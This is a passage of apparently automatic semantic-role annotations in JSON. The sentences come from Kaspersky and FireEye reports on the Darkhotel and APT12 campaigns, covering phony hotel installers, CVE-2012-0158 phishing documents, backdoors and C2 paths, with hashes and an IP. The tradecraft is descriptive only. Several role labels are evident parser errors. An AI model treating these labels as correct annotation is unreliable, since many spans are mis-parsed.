"index": 2}, "ARG2": {"text": "relatively large ( 455Kb )"}}, "comes": {"ARG1": {"text": "This module"}, "V": {"text": "comes", "index": 9}, "ARG2": {"text": "as a part of a WinRar SFX file that drops and starts the module from % APPDATA%\\Microsoft\\Display\\DmaUp3"}}, "drops": {"ARG0": {"text": "a WinRar SFX file"}, "R-ARG0": {"text": "that"}, "V": {"text": "drops", "index": 19}, "ARG1": {"text": "the module"}}, "starts": {"ARG0": {"text": "a WinRar SFX file"}, "R-ARG0": {"text": "that"}, "V": {"text": "starts", "index": 21}, "ARG1": {"text": "the module from % APPDATA%\\Microsoft\\Display\\DmaUp3"}}}, "\n\n\n\n<footer>\nTLP: Green\t                For any inquiries, please contact intelreports@kaspersky.com\n</footer>\n\f\n<header>14</header>\n\n<figure></figure>\n\n\nThis keylogger module encrypts and stores gathered data in a log file, as men-\ntioned previously": {"gathered": {"ARG0": {"text": "This keylogger module encrypts and stores"}, "V": {"text": "gathered", "index": 6}, "ARG1": {"text": "data"}, "ARGM-LOC": {"text": "in a log file"}, "ARGM-ADV": {"text": "as men- tioned previously"}}, "tioned": {"ARG0": {"text": "men-"}, "V": {"text": "tioned", "index": 15}, "ARGM-TMP": {"text": "previously"}}}, "\n\n<figure></figure>\n\n\nOf course, these packages were really installers for Darkhotel APT\u2019s backdoors,\nadded to legitimate installers from Adobe and Google": {"were": {"ARGM-DIS": {"text": "Of course"}, "ARG1": {"text": "these packages"}, "V": {"text": "were", "index": 5}, "ARGM-ADV": {"text": "really"}, "ARG2": {"text": "installers for Darkhotel APT \u2019s backdoors"}}, "added": {"ARG1": {"text": "these packages"}, "V": {"text": "added", "index": 14}, "ARG2": {"text": "to legitimate installers"}, "ARGM-DIR": {"text": "from Adobe and Google"}}, "legitimate": {"V": {"text": "legitimate", "index": 16}, "ARG1": {"text": "installers"}, "ARG2": {"text": "from Adobe and Google"}}}, " This data enables the attackers to present the malicious\niframe precisely to that individual target": {"enables": {"ARG0": {"text": "This data"}, "V": {"text": "enables", "index": 2}, "ARG2": {"text": "the attackers"}, "ARG1": {"text": "to present the malicious iframe precisely to that individual target"}}, "present": {"ARG0": {"text": "the attackers"}, "V": {"text": "present", "index": 6}, "ARG1": {"text": "the malicious"}, "ARGM-ADV": {"text": "iframe precisely to that individual target"}}}, "\nFirst, the virus retrieves all available disks and starting from disk number 4 (D:\\)\nto disk number 20 (Z:\\), finds executable files and infects them": {"retrieves": {"ARGM-TMP": {"text": "First"}, "ARG0": {"text": "the virus"}, "V": {"text": "retrieves", "index": 4}, "ARG1": {"text": "all available disks"}}, "starting": {"ARG1": {"text": "the"}, "V": {"text": "starting", "index": 9}, "ARGM-TMP": {"text": "from disk number 4 ( D:\\ ) to disk number 20 ( Z:\\ )"}}, "disk": {"V": {"text": "disk", "index": 18}, "ARGM-TMP": {"text": "number 20 ( Z:\\ )"}}, "finds": {"ARGM-TMP": {"text": "First"}, "ARG0": {"text": "the virus"}, "V": {"text": "finds", "index": 25}, "ARG1": {"text": "executable files"}}, "infects": {"ARGM-TMP": {"text": "First"}, "ARG0": {"text": "the virus"}, "V": {"text": "infects", "index": 29}, "ARG1": {"text": "them"}}}, "\n</section>\n\n<section>\n<heading>Campaign Codes</heading>\nAlmost every backdoor in this set maintains an internal campaign code or id, used\nin initial c2 communications as described above": {"maintains": {"ARG0": {"text": "Almost every backdoor in this set"}, "V": {"text": "maintains", "index": 6}, "ARG1": {"text": "an internal campaign code or i d , used in initial c2 communications as described above"}}, "used": {"V": {"text": "used", "index": 15}, "ARGM-LOC": {"text": "in initial c2 communications"}, "ARG2": {"text": "as described above"}}, "described": {"V": {"text": "described", "index": 21}, "ARGM-LOC": {"text": "above"}}}, " The attackers first and foremost\nlist and sort victim systems according to their latest c2 check\u00adin": {"according": {"V": {"text": "according", "index": 10}}}, " Sometimes the attachment itself includes\nan Adobe 0-day exploit": {"includes": {"ARGM-TMP": {"text": "Sometimes"}, "ARG2": {"text": "the attachment itself"}, "V": {"text": "includes", "index": 4}, "ARG1": {"text": "an Adobe 0-day exploit"}}}, "\nThe crew spear-phished a set of target systems connected to the Internet through\nChinese ISPs, and developed capabilities within the 0-day exploits to handle\nhardened Windows 8.1 systems": {"phished": {"ARG0": {"text": "The crew spear"}, "V": {"text": "phished", "index": 4}, "ARG1": {"text": "a set of target systems connected to the Internet through Chinese"}}, "connected": {"ARG1": {"text": "target systems"}, "V": {"text": "connected", "index": 10}, "ARG2": {"text": "to the Internet"}, "ARGM-DIR": {"text": "through Chinese"}}, "developed": {"ARG0": {"text": "The"}, "V": {"text": "developed", "index": 19}, "ARG1": {"text": "capabilities"}, "ARGM-TMP": {"text": "within the 0-day exploits"}, "ARGM-ADV": {"text": "to handle hardened Windows 8.1 systems"}}, "handle": {"V": {"text": "handle", "index": 26}, "ARG1": {"text": "hardened Windows 8.1 systems"}}, "hardened": {"V": {"text": "hardened", "index": 27}, "ARG1": {"text": "Windows 8.1 systems"}}}, "\nThis Darkhotel package was downloaded over 30,000 times in less than\nsix months": {"was": {"V": {"text": "was", "index": 3}}, "downloaded": {"ARG1": {"text": "This Darkhotel package"}, "V": {"text": "downloaded", "index": 4}, "ARGM-EXT": {"text": "over 30,000"}, "ARGM-TMP": {"text": "in less than six months"}}}, " Darkhotel uses this method to\ndistribute their Karba Trojan": {"uses": {"ARG0": {"text": "Darkhotel"}, "V": {"text": "uses", "index": 1}, "ARG1": {"text": "this method"}, "ARG2": {"text": "to distribute their Karba Trojan"}}, "distribute": {"V": {"text": "distribute", "index": 5}, "ARG1": {"text": "their Karba Trojan"}}}, " It is bound to a variety of other software packages\nthat vary in name, but the host package is consistently detected as \u201cVirus.Win32": {"is": {"ARG1": {"text": "It"}, "V": {"text": "is", "index": 1}, "ARG2": {"text": "bound to a variety of other software packages that vary in name"}}, "bound": {"V": {"text": "bound", "index": 2}, "ARG1": {"text": "to a variety of other software packages that vary in name"}}, "vary": {"ARG1": {"text": "other software packages"}, "R-ARG1": {"text": "that"}, "V": {"text": "vary", "index": 11}, "ARGM-MNR": {"text": "in name"}}, "is_2": {"V": {"text": "is", "index": 19}}, "detected": {"ARG1": {"text": "the host package"}, "ARGM-MNR": {"text": "consistently/ as \u201c Virus"}, "V": {"text": "detected", "index": 21}, "ARGM-ADV": {"text": "Win32"}}}, " These tools pull down the keylog-\nger, steal information from the system, or download other tools": {"pull": {"ARG0": {"text": "These tools"}, "V": {"text": "pull", "index": 2}, "ARG2": {"text": "down"}, "ARG1": {"text": "the keylog- ger"}}, "steal": {"ARG0": {"text": "These tools"}, "V": {"text": "steal", "index": 8}, "ARG1": {"text": "information"}, "ARG2": {"text": "from the system"}}, "download": {"ARG0": {"text": "These tools"}, "V": {"text": "download", "index": 15}, "ARG1": {"text": "other tools"}}}, " It is also capable of removing some older components, the names\nof which are hardcoded in the body of the malware": {"is": {"ARG1": {"text": "It"}, "V": {"text": "is", "index": 1}, "ARGM-ADV": {"text": "also"}, "ARG2": {"text": "capable of removing some older components , the names of which are hardcoded in the body of the malware"}}, "removing": {"ARG0": {"text": "It"}, "V": {"text": "removing", "index": 5}, "ARG1": {"text": "some older components , the names of which are hardcoded in the body of the malware"}}, "are": {"R-ARG1": {"text": "some older components/ the names of which"}, "V": {"text": "are", "index": 14}, "ARG2": {"text": "hardcoded in the body of the malware"}}, "hardcoded": {"R-ARG1": {"text": "some/ the names of which"}, "V": {"text": "hardcoded", "index": 15}, "ARGM-LOC": {"text": "in the body of the malware"}}}, "\n</section>\n\n<footer>\nTLP: Green\t               For any inquiries, please contact intelreports@kaspersky.com\n</footer>\n\f                                                                                  \n<header>25</header>\n\n<section>\n<heading>Victim Management</heading>\nNew victim systems appear to be systematically vetted": {"appear": {"ARG1": {"text": "New victim systems"}, "V": {"text": "appear", "index": 3}, "C-ARG1": {"text": "to be systematically vetted"}}, "be": {"V": {"text": "be", "index": 5}}, "vetted": {"ARG1": {"text": "New victim systems"}, "ARGM-MNR": {"text": "systematically"}, "V": {"text": "vetted", "index": 7}}}, "\nThe component gathers system information and sends it to the Darkhotel com-\nmand and control servers as detailed in Appendix D": {"gathers": {"ARG0": {"text": "The component"}, "V": {"text": "gathers", "index": 2}, "ARG1": {"text": "system information"}}, "sends": {"ARG0": {"text": "The component"}, "V": {"text": "sends", "index": 6}, "ARG1": {"text": "it"}, "ARG2": {"text": "to the Darkhotel com- mand and control servers as detailed"}, "ARGM-ADV": {"text": "in Appendix D"}}, "detailed": {"V": {"text": "detailed", "index": 17}, "ARGM-LOC": {"text": "in Appendix D"}}}, "\nThis first stage of malware helps the attackers to identify more significant victims,\nleading to the selective download of more advanced stealing tools": {"helps": {"ARG0": {"text": "This first stage of malware"}, "V": {"text": "helps", "index": 5}, "ARG2": {"text": "the attackers"}, "ARG1": {"text": "to identify more significant victims , leading to the selective download of more advanced stealing tools"}}, "identify": {"ARG0": {"text": "the attackers"}, "V": {"text": "identify", "index": 9}, "ARG1": {"text": "more significant victims"}}, "leading": {"V": {"text": "leading", "index": 14}, "ARG2": {"text": "to the selective download of more advanced stealing tools"}}}, "\nThe Darkhotel c2 maintain these directory structures to store and serve ddrlog\ncontent:\n<list>\n\u2022\t /bin/error/ddrlog\n\u2022\t /patch/error/ddrlog\n</list>\n\n\n<footer>\nTLP: Green\t               For any inquiries, please contact intelreports@kaspersky.com\n</footer>\n\f                                                                                     \n<header>23</header>\n\n\nThe following structures appear to be common across servers, but do not pro-\nduce ddrlog and do not maintain an /error/ directory:\n<list>\n\u2022\t /u2/\n\u2022\t /u3/\n\u2022\t /patch2/\n\u2022\t /major/\n\u2022\t inor/\n\u2022\t /asp/\n\u2022\t /update3/\n</list>\nTwo ddrlog files report entries starting January 1, 2009 at 9:16 a.m": {"maintain": {"ARG0": {"text": "The Darkhotel c2"}, "V": {"text": "maintain", "index": 3}, "ARG1": {"text": "these directory structures"}, "ARG2": {"text": "to store"}}, "store": {"ARG0": {"text": "these directory structures"}, "V": {"text": "store", "index": 8}, "ARG1": {"text": "ddrlog content"}}, "serve": {"ARG0": {"text": "The Darkhotel c2"}, "V": {"text": "serve", "index": 10}, "ARG1": {"text": "ddrlog content"}}, "report": {"ARG0": {"text": "Two ddrlog files"}, "V": {"text": "report", "index": 17}, "ARG1": {"text": "entries"}, "ARGM-TMP": {"text": "starting January 1"}}, "starting": {"ARG1": {"text": "Two ddrlog files report entries"}, "V": {"text": "starting", "index": 19}, "ARGM-TMP": {"text": "January 1"}, "ARGM-ADV": {"text": "2009 at"}}}, "\nMore advanced tools, like the keylogger decribed above, are later downloaded to\nthe victim system by one of these implants": {"decribed": {"ARG0": {"text": "the keylogger"}, "V": {"text": "decribed", "index": 7}, "ARGM-LOC": {"text": "above"}}, "are": {"V": {"text": "are", "index": 10}}, "downloaded": {"ARG1": {"text": "More advanced tools , like the keylogger decribed above"}, "ARGM-TMP": {"text": "later"}, "V": {"text": "downloaded", "index": 12}, "ARG2": {"text": "to the victim system"}, "ARG0": {"text": "by one of these implants"}}}, "\n\n<footer>\nTLP: Green\t               For any inquiries, please contact intelreports@kaspersky.com\n</footer>\n\f\n<header>16</header>\n\n\nOne of the most interesting functions of this executable is its unusual delay and\npersistence": {"is": {"ARG1": {"text": "One of the most interesting functions of this executable"}, "V": {"text": "is", "index": 9}, "ARG2": {"text": "its unusual delay and persistence"}}}, "\n\n<figure></figure>\n\n</section>\n\n<section>\n<heading>Available ddrlog Victim Data</heading>\nMany of these c2s maintain a common directory path that serves a ddrlog": {"maintain": {"ARG0": {"text": "Many of these c2s"}, "V": {"text": "maintain", "index": 4}, "ARG1": {"text": "a common directory path that serves a ddrlog"}}, "serves": {"ARG0": {"text": "a common directory path"}, "R-ARG0": {"text": "that"}, "V": {"text": "serves", "index": 10}, "ARG2": {"text": "a ddrlog"}}}, " The attackers set up the environment and hit their\nindividual targets with precision": {"set": {"ARG0": {"text": "The attackers"}, "V": {"text": "set", "index": 2}, "ARG1": {"text": "the environment"}}, "hit": {"ARG0": {"text": "The attackers"}, "V": {"text": "hit", "index": 7}, "ARG1": {"text": "their individual targets"}, "ARG2": {"text": "with precision"}}}, " This component then encrypts and writes the retrieved values\nondisk to a randomly named .tmp, file like ffffz07131101.tmp": {"encrypts": {"ARG1": {"text": "This component"}, "ARGM-TMP": {"text": "then"}, "V": {"text": "encrypts", "index": 3}}, "writes": {"ARG0": {"text": "This component"}, "ARGM-TMP": {"text": "then"}, "V": {"text": "writes", "index": 5}, "ARG1": {"text": "the retrieved values ondisk"}, "ARGM-MNR": {"text": "to a randomly named .tmp , file like ffffz07131101.tmp"}}, "retrieved": {"V": {"text": "retrieved", "index": 7}, "ARG1": {"text": "values ondisk"}}, "ondisk": {"ARG1": {"text": "the retrieved values"}, "V": {"text": "ondisk", "index": 9}}, "named": {"ARGM-MNR": {"text": "randomly"}, "V": {"text": "named", "index": 13}}}, "\n\n<figure></figure>\n\n\nThe most interesting thing about this delivery method is that the hotels require\nguests to use their last name and room number to login, yet only a few guests\nreceived the Darkhotel package": {"is": {"ARG1": {"text": "The most interesting thing about this delivery method"}, "V": {"text": "is", "index": 8}, "ARG2": {"text": "that the hotels require guests to use their last name and room number to login , yet only a few guests received the Darkhotel package"}}, "require": {"ARG0": {"text": "the hotels"}, "V": {"text": "require", "index": 12}, "ARG2": {"text": "guests"}, "ARG1": {"text": "to use their last name and room number to login"}}, "use": {"ARG0": {"text": "guests"}, "V": {"text": "use", "index": 15}, "ARG1": {"text": "their last name and room number"}, "ARG2": {"text": "to login"}}, "login": {"ARG0": {"text": "guests"}, "V": {"text": "login", "index": 23}}, "received": {"ARG0": {"text": "only a few guests"}, "V": {"text": "received", "index": 30}, "ARG1": {"text": "the Darkhotel package"}}}, "\n\n<figure></figure>\n</section>\n<footer>\nTLP: Green\t                For any inquiries, please contact intelreports@kaspersky.com\n</footer>\n\f                                                                                    \n<header>5</header>\n\n<section>\n<heading>\nAnalysis\nDelivery - Hotels/Business Centers and Indiscriminate Spread\n</heading>\n</section>\n<section>\n<heading>Hotels and Business Centers Spread</heading>\nThe Darkhotel APT\u2019s precise malware spread was observed in several hotels\u2019\nnetworks, where visitors connecting to the hotel\u2019s Wi-Fi were prompted to install\nsoftware updates to popular software packages": {"was": {"V": {"text": "was", "index": 7}}, "observed": {"ARG1": {"text": "The Darkhotel APT \u2019s precise malware spread"}, "V": {"text": "observed", "index": 8}, "ARGM-LOC": {"text": "in several hotels \u2019 networks , where visitors connecting to the hotel \u2019s Wi - Fi were prompted to install software updates to popular software packages"}}, "connecting": {"ARG1": {"text": "visitors"}, "V": {"text": "connecting", "index": 17}, "ARG2": {"text": "to the hotel \u2019s Wi - Fi"}}, "were": {"V": {"text": "were", "index": 25}}, "prompted": {"ARGM-LOC": {"text": "several hotels \u2019 networks"}, "R-ARGM-LOC": {"text": "where"}, "ARG1": {"text": "visitors connecting to the hotel \u2019s Wi - Fi"}, "V": {"text": "prompted", "index": 26}, "ARG2": {"text": "to install software updates to popular software packages"}}, "install": {"ARG0": {"text": "visitors connecting to the hotel \u2019s Wi - Fi"}, "V": {"text": "install", "index": 28}, "ARG1": {"text": "software updates"}, "ARGM-PNC": {"text": "to popular software packages"}}}, "\nThis module is designed to update malicious components through recurring checks\nat the C&C server": {"is": {"V": {"text": "is", "index": 2}}, "designed": {"ARG1": {"text": "This module"}, "V": {"text": "designed", "index": 3}, "ARG3": {"text": "to update malicious components through recurring checks at the C&C server"}}, "update": {"ARG0": {"text": "This module"}, "V": {"text": "update", "index": 5}, "ARG1": {"text": "malicious components"}, "ARGM-MNR": {"text": "through recurring checks at the C&C server"}}, "recurring": {"V": {"text": "recurring", "index": 9}, "ARG1": {"text": "checks"}, "ARGM-LOC": {"text": "at the C&C server"}}}, " The dropped downloader\n(d8137ded710d83e2339a97ee78494c34) delivered malcode similar to the\n\u201cInformation Stealer\u201d component functionality summarized below, and detailed\nin Appendix D": {"dropped": {"V": {"text": "dropped", "index": 1}, "ARG1": {"text": "downloader ("}}, "delivered": {"ARG0": {"text": "The dropped downloader ( d8137ded710d83e2339a97ee78494c34 )"}, "V": {"text": "delivered", "index": 6}, "ARG1": {"text": "malcode similar to the \u201c Information Stealer \u201d component functionality"}}, "summarized": {"ARG1": {"text": "the \u201c Information Stealer \u201d component functionality"}, "V": {"text": "summarized", "index": 17}, "ARGM-LOC": {"text": "below"}}, "detailed": {"V": {"text": "detailed", "index": 21}, "ARGM-LOC": {"text": "in Appendix D"}}}, " So, if some other critical\nmalicious component was removed during this period, current module backs up\nand restores access to the system within 6 months": {"was": {"V": {"text": "was", "index": 8}}, "removed": {"ARG1": {"text": "some other critical malicious component"}, "V": {"text": "removed", "index": 9}, "ARGM-TMP": {"text": "during this period"}}, "backs": {"ARGM-DIS": {"text": "So"}, "ARGM-ADV": {"text": "if some other critical malicious component was removed during this period"}, "ARG1": {"text": "current module"}, "V": {"text": "backs", "index": 16}}, "restores": {"ARGM-DIS": {"text": "So"}, "ARGM-ADV": {"text": "if some other critical malicious component was removed during this period"}, "V": {"text": "restores", "index": 19}, "ARG1": {"text": "access to the system"}, "ARGM-TMP": {"text": "within 6 months"}}}, "\nAt the hotels, these installs are selectively distributed to targeted individuals": {"are": {"V": {"text": "are", "index": 6}}, "distributed": {"ARGM-LOC": {"text": "At the hotels"}, "ARG1": {"text": "these installs"}, "ARGM-MNR": {"text": "selectively"}, "V": {"text": "distributed", "index": 8}, "ARG2": {"text": "to targeted individuals"}}, "targeted": {"ARG0": {"text": "these installs"}, "V": {"text": "targeted", "index": 10}, "ARG1": {"text": "individuals"}}}, "\nAs a part of an ongoing investigation, our research led us to embedded iframes\nwithin hotel networks that redirected individuals\u2019 web browsers to phony install-\ners": {"led": {"ARGM-PRD": {"text": "As a part of an ongoing investigation"}, "ARG0": {"text": "our research"}, "V": {"text": "led", "index": 10}, "ARG1": {"text": "us"}, "ARG2": {"text": "to embedded iframes within hotel networks that redirected individuals \u2019 web browsers to phony install- ers"}}, "embedded": {"ARG1": {"text": "us"}, "V": {"text": "embedded", "index": 13}, "ARG2": {"text": "iframes within hotel networks that redirected individuals \u2019 web browsers to phony install- ers"}}, "redirected": {"R-ARG0": {"text": "that"}, "V": {"text": "redirected", "index": 19}, "ARG1": {"text": "individuals \u2019 web browsers"}, "ARG2": {"text": "to phony install- ers"}}, "phony": {"ARG0": {"text": "individuals \u2019 web browsers"}, "V": {"text": "phony", "index": 25}, "ARG1": {"text": "install- ers"}}}, " Addition-\nally, seeding p2p networks with widely spread malware and 0-day spear-phishing\nattacks demonstrate that the Darkhotel APT maintains an effective toolset and a\nlong-running operation behind the questionable hospitality it shows its guests": {"seeding": {"V": {"text": "seeding", "index": 3}, "ARG1": {"text": "p2p networks"}, "ARGM-MNR": {"text": "with widely spread malware"}}, "spread": {"ARGM-MNR": {"text": "widely"}, "V": {"text": "spread", "index": 8}, "ARG1": {"text": "malware"}}, "phishing": {"ARG1": {"text": "spear/ attacks"}, "V": {"text": "phishing", "index": 14}}, "demonstrate": {"ARG0": {"text": "Addition- ally ,/ seeding p2p networks with widely spread malware and 0-day spear - phishing attacks"}, "V": {"text": "demonstrate", "index": 16}, "ARG1": {"text": "that the Darkhotel APT maintains an effective toolset and a long - running operation behind the questionable hospitality it shows its guests"}}, "maintains": {"ARG0": {"text": "the Darkhotel APT"}, "V": {"text": "maintains", "index": 21}, "ARG1": {"text": "an effective toolset and a long - running operation"}}, "running": {"ARGM-TMP": {"text": "long"}, "V": {"text": "running", "index": 29}, "ARG0": {"text": "operation"}}, "shows": {"ARGM-ADV": {"text": "the Darkhotel APT maintains an effective toolset and a long - running operation behind the questionable hospitality"}, "R-ARG0": {"text": "it"}, "V": {"text": "shows", "index": 36}, "ARG1": {"text": "its guests"}}}, " The code simply\nbrute forces the list of mapped removable drives": {"brute": {"ARG0": {"text": "The code"}, "ARGM-ADV": {"text": "simply"}, "V": {"text": "brute", "index": 3}, "ARG2": {"text": "forces"}, "ARG1": {"text": "the list of mapped removable drives"}}, "mapped": {"V": {"text": "mapped", "index": 8}, "ARG1": {"text": "removable drives"}}}, "\n</section>\n\n<section>\n<heading>Background</heading>\n\nFrom October 2012 to May 2014, FireEye observed APT12 utilizing RIPTIDE, a proxy-aware backdoor\nthat communicates via HTTP to a hard-coded command and control (C2) server": {"observed": {"ARGM-TMP": {"text": "From October 2012 to May 2014"}, "ARG0": {"text": "FireEye"}, "V": {"text": "observed", "index": 8}, "ARG1": {"text": "APT12 utilizing RIPTIDE , a proxy - aware backdoor that communicates via HTTP to a hard - coded command and control ( C2 ) server"}}, "utilizing": {"ARGM-MNR": {"text": "APT12"}, "V": {"text": "utilizing", "index": 10}, "ARG1": {"text": "RIPTIDE"}}, "communicates": {"ARG1": {"text": "a proxy - aware backdoor"}, "R-ARG1": {"text": "that"}, "V": {"text": "communicates", "index": 19}, "ARG2": {"text": "via HTTP to a hard - coded command and control ( C2 ) server"}}, "coded": {"ARGM-MNR": {"text": "hard"}, "V": {"text": "coded", "index": 26}, "ARG1": {"text": "command"}}}, " This spear phish contained a malicious Word document that\nexploited CVE-2012-0158": {"contained": {"ARG0": {"text": "This spear phish"}, "V": {"text": "contained", "index": 3}, "ARG1": {"text": "a malicious Word document that exploited CVE-2012 - 0158"}}, "exploited": {"ARG0": {"text": "a malicious Word document"}, "R-ARG0": {"text": "that"}, "V": {"text": "exploited", "index": 9}, "ARG1": {"text": "CVE-2012 - 0158"}}}, " Both backdoors were dropped from malicious documents built\nutilizing the \u201cTran Duy Linh\u201d exploit kit, which exploited CVE-2012-0158": {"were": {"V": {"text": "were", "index": 2}}, "dropped": {"ARG1": {"text": "Both backdoors"}, "V": {"text": "dropped", "index": 3}, "ARG2": {"text": "from malicious documents built utilizing the \u201c Tran Duy Linh \u201d exploit kit , which exploited CVE-2012 - 0158"}}, "built": {"ARG1": {"text": "malicious documents"}, "V": {"text": "built", "index": 7}}, "utilizing": {"V": {"text": "utilizing", "index": 8}, "ARG1": {"text": "the \u201c Tran Duy Linh \u201d exploit kit , which exploited CVE-2012 - 0158"}}, "exploited": {"ARG1": {"text": "the \u201c Tran Duy Linh \u201d exploit kit"}, "R-ARG1": {"text": "which"}, "V": {"text": "exploited", "index": 19}, "ARG2": {"text": "CVE-2012 - 0158"}}}, "\n</section>\n\n<section>\n<heading>THREEBYTE Malware Family</heading>\n\nOn Monday August 25, 2014 we observed a different spear phish email sent from lilywang823@gmail.com\nto a technology company located in Taiwan": {"observed": {"ARGM-TMP": {"text": "On Monday August 25/ 2014"}, "ARG0": {"text": "we"}, "V": {"text": "observed", "index": 7}, "ARG1": {"text": "a different spear phish email sent from lilywang823@gmail.com to a technology company located in Taiwan"}}, "sent": {"ARG1": {"text": "a different spear phish email"}, "V": {"text": "sent", "index": 13}, "ARG3": {"text": "from lilywang823@gmail.com"}, "ARG2": {"text": "to a technology company located in Taiwan"}}, "located": {"ARG1": {"text": "a technology company"}, "V": {"text": "located", "index": 20}, "ARGM-LOC": {"text": "in Taiwan"}}}, " FireEye observed APT12 deliver these exploit documents\nvia phishing emails in multiple cases": {"observed": {"ARG0": {"text": "FireEye"}, "V": {"text": "observed", "index": 1}, "ARG1": {"text": "APT12 deliver these exploit documents via phishing emails in multiple cases"}}, "deliver": {"ARG0": {"text": "APT12"}, "V": {"text": "deliver", "index": 3}, "ARG1": {"text": "these exploit documents"}, "ARGM-MNR": {"text": "via phishing emails"}}, "phishing": {"V": {"text": "phishing", "index": 8}, "ARG1": {"text": "emails"}}}, "\n\nSimilar to the newly discovered HIGHTIDE samples documented above, this malicious document dropped\na backdoor to C:\\DOCUMENTS and SETTINGS\\{user}\\LOCAL SETTINGS\\Temp\\word.exe": {"discovered": {"ARGM-TMP": {"text": "newly"}, "V": {"text": "discovered", "index": 4}, "ARG1": {"text": "HIGHTIDE samples"}}, "documented": {"ARG1": {"text": "the newly discovered HIGHTIDE samples"}, "V": {"text": "documented", "index": 7}, "ARGM-LOC": {"text": "above"}}, "dropped": {"ARGM-ADV": {"text": "Similar to the newly discovered HIGHTIDE samples documented above"}, "ARG1": {"text": "this malicious document"}, "V": {"text": "dropped", "index": 13}, "ARG4": {"text": "a backdoor to C:\\DOCUMENTS"}}}, "\nWe suspect this change was a direct result of the Arbor blog post in order to decrease detection of\nRIPTIDE by security vendors": {"suspect": {"ARG0": {"text": "We"}, "V": {"text": "suspect", "index": 1}, "ARG1": {"text": "this change was a direct result of the Arbor blog post in order to decrease detection of RIPTIDE by security vendors"}}, "was": {"ARG1": {"text": "this change"}, "V": {"text": "was", "index": 4}, "ARG2": {"text": "a direct result of the Arbor blog post"}, "ARGM-PRP": {"text": "in order to decrease detection of RIPTIDE by security vendors"}}, "decrease": {"V": {"text": "decrease", "index": 16}, "ARG1": {"text": "detection of RIPTIDE by security vendors"}}}, " This malicious Word document had an MD5 of 499bec15ac83f2c8998f03917b63652e\nand dropped a backdoor to C:\\DOCUMENTS and SETTINGS\\{user}\\LOCAL SETTINGS\\Temp\\word.exe": {"had": {"ARG0": {"text": "This malicious Word document"}, "V": {"text": "had", "index": 4}, "ARG1": {"text": "an MD5 of 499bec15ac83f2c8998f03917b63652e"}}, "dropped": {"ARG0": {"text": "This malicious Word document"}, "V": {"text": "dropped", "index": 10}, "ARG1": {"text": "a backdoor to C:\\DOCUMENTS"}}}, "\n\nSimilar to RIPTIDE and HIGHTIDE, the WATERSPOUT backdoor is an HTTP-based backdoor that\ncommunicates with its C2 server": {"is": {"ARGM-PRD": {"text": "Similar to RIPTIDE and HIGHTIDE"}, "ARG1": {"text": "the WATERSPOUT backdoor"}, "V": {"text": "is", "index": 9}, "ARG2": {"text": "an HTTP - based backdoor that communicates with its C2 server"}}, "based": {"ARG2": {"text": "HTTP"}, "V": {"text": "based", "index": 13}}}, " Attached to this email was another malicious document that was designed to exploit\nCVE-2012-0158": {"Attached": {"V": {"text": "Attached", "index": 0}, "ARG2": {"text": "to this email"}, "ARG1": {"text": "another malicious document that was designed to exploit CVE-2012 - 0158"}}, "was": {"ARG1": {"text": "Attached to this email"}, "V": {"text": "was", "index": 4}, "ARG2": {"text": "another malicious document that was designed to exploit CVE-2012 - 0158"}}, "was_2": {"V": {"text": "was", "index": 9}}, "designed": {"ARG1": {"text": "another malicious document"}, "R-ARG1": {"text": "that"}, "V": {"text": "designed", "index": 10}, "ARG3": {"text": "to exploit CVE-2012 - 0158"}}, "exploit": {"ARG0": {"text": "that"}, "V": {"text": "exploit", "index": 12}}}, " Based on past APT12 activity, we expect the threat group to continue\nto utilize phishing as a malware delivery method": {"Based": {"V": {"text": "Based", "index": 0}, "ARG2": {"text": "on past APT12 activity"}, "ARG1": {"text": "we"}}, "expect": {"ARGM-MNR": {"text": "Based on past APT12 activity"}, "ARG0": {"text": "we"}, "V": {"text": "expect", "index": 7}, "ARG1": {"text": "the threat group to continue to utilize phishing as a malware delivery method"}}, "continue": {"ARG0": {"text": "the threat group"}, "V": {"text": "continue", "index": 12}, "ARG1": {"text": "to utilize phishing as a malware delivery method"}}, "utilize": {"ARG0": {"text": "the threat group"}, "V": {"text": "utilize", "index": 14}, "ARG1": {"text": "phishing"}, "ARGM-PRD": {"text": "as a malware delivery method"}}, "phishing": {"ARG0": {"text": "the threat group"}, "V": {"text": "phishing", "index": 15}, "ARG1": {"text": "as a malware delivery method"}}}, "\n</section>\n\n<section>\n<heading>HIGHTIDE Malware Family</heading>\n\nOn Sunday August 24, 2014 we observed a spear phish email sent to a Taiwanese government ministry": {"observed": {"ARGM-TMP": {"text": "On Sunday August 24/ 2014"}, "ARG0": {"text": "we"}, "V": {"text": "observed", "index": 7}, "ARG1": {"text": "a spear phish email sent to a Taiwanese government ministry"}}, "sent": {"ARG1": {"text": "a spear phish email"}, "V": {"text": "sent", "index": 12}, "ARG2": {"text": "to a Taiwanese government ministry"}}}, "\n\n\n<figure></figure>\n\n<caption>Figure 2: APT12 Spearphishing Email</caption>\n\nThe exploit document dropped the HIGHTIDE backdoor with the following properties:\n<table>\nMD5     6e59861931fa2796ee107dc27bfdd480\nSize    75264 bytes\nComplie 2014-08-23 08:22:49\nTime\nImport ead55ef2b18a80c00786c25211981570\nHash\n</table>\n\f\nThe HIGHTIDE backdoor connected directly to 141.108.2.157": {"connected": {"ARG1": {"text": "The HIGHTIDE"}, "V": {"text": "connected", "index": 3}, "ARGM-MNR": {"text": "directly"}, "ARG2": {"text": "to 141.108.2.157"}}}, "\n</list>\n</section>\n\n<section>\n<heading>WATERSPOUT Malware Family</heading>\n\nOn August 25, 2014, we observed another round of spear phishing emails targeting a high-technology\ncompany in Japan": {"observed": {"ARGM-TMP": {"text": "On August 25 , 2014"}, "ARG0": {"text": "we"}, "V": {"text": "observed", "index": 7}, "ARG1": {"text": "another round of spear phishing emails targeting a high - technology company in Japan"}}, "phishing": {"V": {"text": "phishing", "index": 12}, "ARG1": {"text": "emails"}}, "targeting": {"ARG0": {"text": "spear phishing emails"}, "V": {"text": "targeting", "index": 14}, "ARG1": {"text": "a high - technology company in Japan"}}}, " The RIPTIDE exploit document drops its\nexecutable file into the C:\\Documents and Settings\\{user}\\Application Data\\Location folder while the\nHIGHTIDE exploit document drops its executable file into the C:\\DOCUMENTS and SETTINGS\\\n{user}\\LOCAL SETTINGS\\Temp\\ folder": {"drops": {"ARG0": {"text": "The RIPTIDE exploit document"}, "V": {"text": "drops", "index": 4}, "ARG1": {"text": "its executable file"}, "ARG4": {"text": "into the C:\\Documents"}}, "drops_2": {"ARG0": {"text": "the HIGHTIDE exploit document"}, "V": {"text": "drops", "index": 20}, "ARG1": {"text": "its executable file"}, "ARG4": {"text": "into the C:\\DOCUMENTS"}}}, "\n<figure>\nMD5                              File Name                            Exploit\n73f493f6a2b0da23a79b50765c164e88 